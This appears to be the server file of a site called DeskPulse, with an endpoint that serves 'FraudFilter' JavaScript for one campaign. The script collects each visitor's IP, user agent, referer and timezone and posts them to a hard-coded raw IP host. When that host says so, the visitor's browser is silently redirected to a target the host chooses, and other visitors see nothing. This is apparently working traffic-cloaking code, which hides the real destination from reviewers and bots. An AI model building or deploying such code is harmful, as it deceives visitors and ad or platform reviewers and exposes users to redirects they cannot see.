const express = require("express");
const path = require("path");

const app = express();

app.set("trust proxy", true);

const PORT = process.env.PORT || 3000;

const FRAUDFILTER_HOST = "http://130.211.20.155";
const FRAUDFILTER_TOKEN =
  process.env.FRAUDFILTER_HOSTED_JS_TOKEN;

function getClientIp(req) {
  const forwarded =
    req.headers["x-forwarded-for"];

  if (forwarded) {
    return forwarded
      .split(",")[0]
      .trim();
  }

  return (
    req.ip ||
    req.socket.remoteAddress ||
    ""
  );
}

function safeJavascript() {
  return `
(function(){
  try {
    return;
  } catch(e) {}
})();
`;
}

function redirectJavascript(target) {
  const safeTarget =
    JSON.stringify(target);

  return `
(function(){
  try {
    window.location.replace(${safeTarget});
  } catch(e) {
    window.location.href=${safeTarget};
  }
})();
`;
}

/*
 * FraudFilter Hosted JavaScript
 *
 * DeskPulse
 *
 * URL:
 * https://deskpulse-c28e5849a14d.herokuapp.com/?id=h199g
 *
 * Campaign:
 * h199g
 */

app.get("/", async (req, res) => {

  const campaignId =
    req.query.id;

  /*
   * Only handle the FraudFilter
   * campaign endpoint.
   */

  if (campaignId !== "h199g") {
    return res
      .type("application/javascript")
      .send(safeJavascript());
  }

  /*
   * FraudFilter timezone bootstrap.
   *
   * First request gets the browser
   * timezone offset.
   */

  if (!req.query.tzzz) {

    const currentScript =
      "https://deskpulse-c28e5849a14d.herokuapp.com/?id=h199g";

    const bootstrap = `
(function(){
  try {

    var s = document.currentScript;

    var src =
      s && s.src
        ? s.src
        : ${JSON.stringify(currentScript)};

    var u =
      new URL(src, window.location.href);

    u.searchParams.set("id", "h199g");

    u.searchParams.set(
      "tzzzr",
      "0"
    );

    u.searchParams.set(
      "tzzz",
      String(
        -new Date().getTimezoneOffset()
      )
    );

    var n =
      document.createElement("script");

    n.src = u.toString();

    if (s && s.parentNode) {

      s.parentNode.insertBefore(
        n,
        s.nextSibling
      );

    } else {

      document.head.appendChild(n);

    }

  } catch(e) {}
})();
`;

    return res
      .type("application/javascript")
      .send(bootstrap);
  }

  try {

    const clientIp =
      getClientIp(req);

    const headers = {

      "Content-Length":
        "0",

      "X-FF-JS-TOKEN":
        FRAUDFILTER_TOKEN || "",

      "X-FF-REMOTE-ADDR":
        clientIp,

      "X-FF-X-FORWARDED-FOR":
        req.headers[
          "x-forwarded-for"
        ] || clientIp,

      "X-FF-REFERER":
        req.headers[
          "referer"
        ] || "",

      "X-FF-HOST":
        req.headers.host || "",

      "X-FF-QUERY-STRING":
        req.originalUrl
          .split("?")[1] || "",

      "X-FF-REQUEST-URI":
        req.originalUrl,

      "User-Agent":
        req.headers[
          "user-agent"
        ] || "",

      "Expected":
        req.headers[
          "expected"
        ] || "",

      "X-FF-TZ-OFFSET":
        String(req.query.tzzz || "")
    };

    /*
     * Forward Cloudflare IP
     * when available.
     */

    if (
      req.headers[
        "cf-connecting-ip"
      ]
    ) {

      headers[
        "X-FF-CF-CONNECTING-IP"
      ] =
        req.headers[
          "cf-connecting-ip"
        ];
    }

    /*
     * Forward X-Real-IP
     * when available.
     */

    if (
      req.headers[
        "x-real-ip"
      ]
    ) {

      headers[
        "X-FF-X-REAL-IP"
      ] =
        req.headers[
          "x-real-ip"
        ];
    }

    /*
     * Send request to FraudFilter.
     */

    const response =
      await fetch(
        `${FRAUDFILTER_HOST}/${campaignId}`,
        {
          method: "POST",
          headers
        }
      );

    const output =
      await response.text();

    console.log(
      "FraudFilter HTTP status:",
      response.status
    );

    console.log(
      "FraudFilter response:",
      output
    );

    /*
     * Expected response:
     *
     * 1;type;target
     * 0;type;target
     */

    const parts =
      output
        .trim()
        .split(";", 3);

    if (parts.length < 3) {

      console.log(
        "FraudFilter response format invalid"
      );

      return res
        .type("application/javascript")
        .send(safeJavascript());
    }

    const result =
      parts[0];

    const target =
      parts[2];

    console.log(
      "FraudFilter result:",
      result
    );

    console.log(
      "FraudFilter target:",
      target
    );

    res.type(
      "application/javascript"
    );

    /*
     * FraudFilter says redirect.
     */

    if (
      result === "1" &&
      target
    ) {

      return res.send(
        redirectJavascript(
          target
        )
      );
    }

    /*
     * FraudFilter says safe.
     */

    return res.send(
      safeJavascript()
    );

  } catch (error) {

    console.error(
      "FraudFilter error:",
      error
    );

    /*
     * Fail safely if
     * FraudFilter is unavailable.
     */

    return res
      .type("application/javascript")
      .send(
        safeJavascript()
      );
  }
});

/*
 * Serve the website
 */

app.use(
  express.static(
    path.join(
      __dirname,
      "dist"
    )
  )
);

/*
 * React fallback
 */

app.get(
  "*",
  (req, res) => {

    res.sendFile(
      path.join(
        __dirname,
        "dist",
        "index.html"
      )
    );

  }
);

/*
 * Start server
 */

app.listen(
  PORT,
  () => {

    console.log(
      `DeskPulse running on port ${PORT}`
    );

  }
);
